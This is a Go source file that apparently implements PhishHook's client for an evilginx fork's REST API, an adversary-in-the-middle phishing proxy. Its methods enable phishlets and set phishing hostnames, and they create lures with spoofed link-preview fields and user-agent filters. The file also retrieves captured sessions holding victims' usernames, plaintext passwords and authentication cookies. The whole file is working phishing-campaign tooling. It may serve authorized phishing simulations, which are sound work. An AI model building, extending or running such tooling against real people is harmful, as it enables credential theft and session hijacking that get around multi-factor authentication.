package evilginx

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// Client talks to the evilginx REST API exposed by the
// evilginx3-phishhook fork. It is intentionally small: every method maps
// to one API route and returns the decoded JSON payload.
//
// The API is expected to be bound to loopback and reached from PhishHook
// on the same host, so no TLS verification options are exposed.
type Client struct {
	baseURL string
	apiKey  string
	http    *http.Client
}

// NewClient returns a client for the evilginx REST API at baseURL,
// authenticated with the given bearer token.
func NewClient(baseURL, apiKey string) *Client {
	return &Client{
		baseURL: strings.TrimSuffix(baseURL, "/"),
		apiKey:  apiKey,
		http: &http.Client{
			Timeout: 15 * time.Second,
		},
	}
}

// Configured reports whether the client has enough information to talk
// to an evilginx instance.
func (c *Client) Configured() bool {
	return c != nil && c.baseURL != "" && c.apiKey != ""
}

// Status is the payload returned by GET /api/status.
type Status struct {
	Version      string `json:"version"`
	Domain       string `json:"domain"`
	ExternalIP   string `json:"external_ipv4"`
	BindIP       string `json:"bind_ipv4"`
	HttpsPort    int    `json:"https_port"`
	DnsPort      int    `json:"dns_port"`
	Autocert     bool   `json:"autocert"`
	GophishURL   string `json:"gophish_admin_url"`
	GophishKey   bool   `json:"gophish_api_key_set"`
	UnauthURL    string `json:"unauth_url"`
	Sessions     int    `json:"active_sessions"`
	EnabledSites int    `json:"enabled_sites"`
}

// Phishlet describes a phishlet in list and detail responses.
type Phishlet struct {
	Name       string   `json:"name"`
	Template   bool     `json:"is_template"`
	Status     string   `json:"status"`
	Hidden     bool     `json:"hidden"`
	Hostname   string   `json:"hostname"`
	PhishHosts []string `json:"phish_hosts"`
	Redirector string   `json:"redirector"`
}

// Lure describes an evilginx lure.
type Lure struct {
	Id              string `json:"id"`
	Hostname        string `json:"hostname"`
	Path            string `json:"path"`
	URL            string `json:"url"`
	RedirectUrl     string `json:"redirect_url"`
	Phishlet        string `json:"phishlet"`
	Redirector      string `json:"redirector"`
	UserAgentFilter string `json:"ua_filter"`
	Info            string `json:"info"`
	OgTitle         string `json:"og_title"`
	OgDescription   string `json:"og_desc"`
	OgImageUrl      string `json:"og_image_url"`
	OgUrl           string `json:"og_url"`
	PausedUntil     int64  `json:"paused"`
}

// SessionSummary is the list view of a captured session.
type SessionSummary struct {
	Id             int    `json:"id"`
	Phishlet       string `json:"phishlet"`
	Username       string `json:"username"`
	CreateTime     int64  `json:"create_time"`
	UpdateTime     int64  `json:"update_time"`
	SessionId      string `json:"session_id"`
	CredsCaptured  bool   `json:"creds_captured"`
	TokensCaptured bool   `json:"tokens_captured"`
}

// CookieToken is a captured authentication cookie.
type CookieToken struct {
	Name     string `json:"Name"`
	Value    string `json:"Value"`
	Path     string `json:"Path"`
	HttpOnly bool   `json:"HttpOnly"`
}

// SessionDetail is the full view of a captured session.
type SessionDetail struct {
	Id           int                          `json:"id"`
	Phishlet     string                       `json:"phishlet"`
	LandingURL   string                       `json:"landing_url"`
	Username     string                       `json:"username"`
	Password     string                       `json:"password"`
	Custom       map[string]string            `json:"custom"`
	BodyTokens   map[string]string            `json:"body_tokens"`
	HttpTokens   map[string]string            `json:"http_tokens"`
	CookieTokens map[string]map[string]CookieToken `json:"tokens"`
	SessionId    string                       `json:"session_id"`
	UserAgent    string                       `json:"useragent"`
	RemoteAddr   string                       `json:"remote_addr"`
	CreateTime   int64                        `json:"create_time"`
	UpdateTime   int64                        `json:"update_time"`
}

// ErrorResponse is the error payload produced by the evilginx fork.
type ErrorResponse struct {
	Error string `json:"error"`
}

// APIError wraps an error response from the evilginx REST API.
type APIError struct {
	StatusCode int
	Message    string
}

func (e *APIError) Error() string {
	return fmt.Sprintf("evilginx api: %d: %s", e.StatusCode, e.Message)
}

// do performs an authenticated request against the API and decodes the
// JSON response into out (when out is non-nil).
func (c *Client) do(method, path string, body interface{}, out interface{}) error {
	if !c.Configured() {
		return fmt.Errorf("evilginx api is not configured")
	}
	var reader io.Reader
	if body != nil {
		enc, err := json.Marshal(body)
		if err != nil {
			return err
		}
		reader = bytes.NewReader(enc)
	}
	req, err := http.NewRequest(method, c.baseURL+path, reader)
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+c.apiKey)
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := c.http.Do(req)
	if err != nil {
		return fmt.Errorf("evilginx api unreachable: %w", err)
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	if resp.StatusCode >= 400 {
		var er ErrorResponse
		if json.Unmarshal(data, &er) == nil && er.Error != "" {
			return &APIError{StatusCode: resp.StatusCode, Message: er.Error}
		}
		return &APIError{StatusCode: resp.StatusCode, Message: strings.TrimSpace(string(data))}
	}
	if out == nil {
		return nil
	}
	return json.Unmarshal(data, out)
}

// GetStatus returns the evilginx server status.
func (c *Client) GetStatus() (*Status, error) {
	var s Status
	if err := c.do(http.MethodGet, "/api/status", nil, &s); err != nil {
		return nil, err
	}
	return &s, nil
}

// ListPhishlets returns all phishlets with their runtime status.
func (c *Client) ListPhishlets() ([]Phishlet, error) {
	var ps []Phishlet
	if err := c.do(http.MethodGet, "/api/phishlets", nil, &ps); err != nil {
		return nil, err
	}
	return ps, nil
}

// EnablePhishlet activates a phishlet and provisions certificates.
func (c *Client) EnablePhishlet(name string) error {
	return c.do(http.MethodPost, "/api/phishlets/"+name+"/enable", nil, nil)
}

// DisablePhishlet deactivates a phishlet.
func (c *Client) DisablePhishlet(name string) error {
	return c.do(http.MethodPost, "/api/phishlets/"+name+"/disable", nil, nil)
}

// SetPhishletHostname sets the phishing domain for a phishlet.
func (c *Client) SetPhishletHostname(name, hostname string) error {
	body := map[string]string{"hostname": hostname}
	return c.do(http.MethodPost, "/api/phishlets/"+name+"/hostname", body, nil)
}

// GetPhishletHosts returns the DNS records required for a phishlet.
func (c *Client) GetPhishletHosts(name string) ([]string, error) {
	var resp struct {
		Phishlet string   `json:"phishlet"`
		Records  []string `json:"records"`
	}
	if err := c.do(http.MethodGet, "/api/phishlets/"+name+"/hosts", nil, &resp); err != nil {
		return nil, err
	}
	return resp.Records, nil
}

// ListLures returns all configured lures.
func (c *Client) ListLures() ([]Lure, error) {
	var ls []Lure
	if err := c.do(http.MethodGet, "/api/lures", nil, &ls); err != nil {
		return nil, err
	}
	return ls, nil
}

// CreateLure adds a new lure for the given phishlet.
func (c *Client) CreateLure(l Lure) (*Lure, error) {
	var out Lure
	if err := c.do(http.MethodPost, "/api/lures", l, &out); err != nil {
		return nil, err
	}
	return &out, nil
}

// UpdateLure replaces a lure's configuration.
func (c *Client) UpdateLure(id string, l Lure) (*Lure, error) {
	var out Lure
	if err := c.do(http.MethodPut, "/api/lures/"+id, l, &out); err != nil {
		return nil, err
	}
	return &out, nil
}

// DeleteLure removes a lure.
func (c *Client) DeleteLure(id string) error {
	return c.do(http.MethodDelete, "/api/lures/"+id, nil, nil)
}

// ListSessions returns a summary of all captured sessions.
func (c *Client) ListSessions() ([]SessionSummary, error) {
	var ss []SessionSummary
	if err := c.do(http.MethodGet, "/api/sessions", nil, &ss); err != nil {
		return nil, err
	}
	return ss, nil
}

// GetSession returns the full detail of a captured session, including
// authentication tokens.
func (c *Client) GetSession(sid string) (*SessionDetail, error) {
	var s SessionDetail
	if err := c.do(http.MethodGet, "/api/sessions/"+sid, nil, &s); err != nil {
		return nil, err
	}
	return &s, nil
}

// DeleteSession removes a captured session.
func (c *Client) DeleteSession(sid string) error {
	return c.do(http.MethodDelete, "/api/sessions/"+sid, nil, nil)
}
